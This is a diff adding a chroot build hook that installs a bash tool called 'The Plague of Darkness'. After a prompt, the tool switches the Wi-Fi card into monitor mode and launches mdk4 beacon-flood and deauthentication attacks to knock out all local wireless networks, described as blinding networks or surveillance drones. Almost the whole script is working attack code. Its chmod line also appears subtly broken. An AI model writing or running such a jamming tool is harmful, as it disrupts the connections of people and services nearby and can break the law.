@@ -1,0 +1,57 @@
+#!/usr/bin/env -S prlimit --as=1073741824 unshare /bin/bash
+export GIT_TERMINAL_PROMPT=0
+export DEBIAN_FRONTEND=noninteractive
+# SPDX-License-Identifier: AGPL-3.0-or-later
+# 0998-alfred-plague-of-darkness.hook.chroot
+# The Plague of Darkness: Radio Frequency Blinding & Jamming
+set +e
+
+echo "[0998] Configuring The Plague of Darkness (RF Blinding)"
+
+# We install a tool that uses standard WiFi hardware (via aircrack-ng/mdk4 suite)
+# to blast deauthentication and beacon flood frames, effectively blinding 
+# local wireless networks or surveillance drones.
+
+cat << 'EOF' > /usr/local/bin/alfred-plague-of-darkness
+#!/bin/bash
+echo "╔═══════════════════════════════════════════════════════════╗"
+echo "║  THE PLAGUE OF DARKNESS — Radio Frequency Blinder         ║"
+echo "║  'And there was a thick darkness...' — Exodus 10:22       ║"
+echo "╚═══════════════════════════════════════════════════════════╝"
+echo ""
+echo "WARNING: Activating this will drop all local WiFi connections"
+echo "and begin flooding the local RF spectrum with cryptographic noise."
+read -p "Unleash the Plague? (y/N) " -n 1 -r
+echo ""
+if [[ $REPLY =~ ^[Yy]$ ]]
+then
+    # Find active wireless interface
+    WIFI_IFACE=$(iw dev | awk '$1=="Interface"{print $2}' | head -n 1)
+    
+    if [ -z "$WIFI_IFACE" ]; then
+        echo "Error: No wireless interface found."
+exit 0
+    fi
+    
+    echo "[+] Dropping interface $WIFI_IFACE and enabling monitor mode..."
+    ip link set $WIFI_IFACE down
+    iw dev $WIFI_IFACE set type monitor
+    ip link set $WIFI_IFACE up
+    
+    echo "[+] Initiating MDK4 beacon flood and WPA deauthentication..."
+    # mdk4 b - blasts fake AP beacons
+    # mdk4 d - blasts deauth packets
+    mdk4 $WIFI_IFACE b -w g &
+    mdk4 $WIFI_IFACE d &
+    
+    echo "The Plague of Darkness has descended. Press CTRL+C to stop."
+    wait
+else
+    echo "Protocol cancelled."
+fi
+EOF
+
+[ -e "0755" ] && chmod 0755 /usr/local/bin/alfred-plague-of-darkness || true
+echo "[0998] The Plague of Darkness is dormant."
+
+exit 0
